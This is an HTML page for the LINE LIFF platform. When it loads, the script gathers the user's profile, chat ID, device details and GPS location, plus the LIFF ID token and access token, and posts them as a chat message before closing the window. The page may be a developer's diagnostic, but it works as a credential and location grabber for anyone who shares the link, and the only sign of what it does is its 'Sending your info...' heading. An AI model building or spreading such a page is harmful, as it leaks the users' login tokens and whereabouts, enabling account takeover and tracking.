<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>LIFF Full Info</title>
  <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
</head>
<body>
  <h2>Sending your info...</h2>
  <script>
    async function main() {
      try {
        await liff.init({ liffId: "2008222900-obNEWjmv" });

        if (!liff.isInClient()) {
          document.body.innerHTML = "<p>Please open this link in the LINE app.</p>";
          return;
        }

        // PROFILE
        const profile = await liff.getProfile();

        // CONTEXT
        const context = liff.getContext();

        // DEVICE
        const os = liff.getOS();
        const language = liff.getLanguage();
        const version = liff.getVersion();

        // LOCATION
        let locationInfo = "Not granted or not available";
        try {
          const location = await liff.getLocation();
          locationInfo = `Latitude: ${location.latitude}, Longitude: ${location.longitude}`;
        } catch {}

        // TOKENS
        const idToken = liff.getIDToken() || "Not available";
        const accessToken = liff.getAccessToken() || "Not available";

        // BUILD MESSAGE
        const message = `
=== PROFILE ===
Name: ${profile.displayName}
User ID: ${profile.userId}
Status: ${profile.statusMessage || "None"}
Picture: ${profile.pictureUrl || "None"}

=== CONTEXT ===
Type: ${context.type}
Chat ID: ${context.chatId || "None"}

=== DEVICE ===
OS: ${os}
Language: ${language}
LIFF SDK Version: ${version}

=== LOCATION ===
${locationInfo}

=== TOKENS ===
ID Token: ${idToken}
Access Token: ${accessToken}
        `;

        // SEND MESSAGE
        await liff.sendMessages([{ type: "text", text: message }]);

        document.body.innerHTML = "<p>All info sent!</p>";
        liff.closeWindow();

      } catch (err) {
        console.error(err);
        document.body.innerHTML = "<p>Error: " + err + "</p>";
      }
    }

    main();
  </script>
</body>
</html>
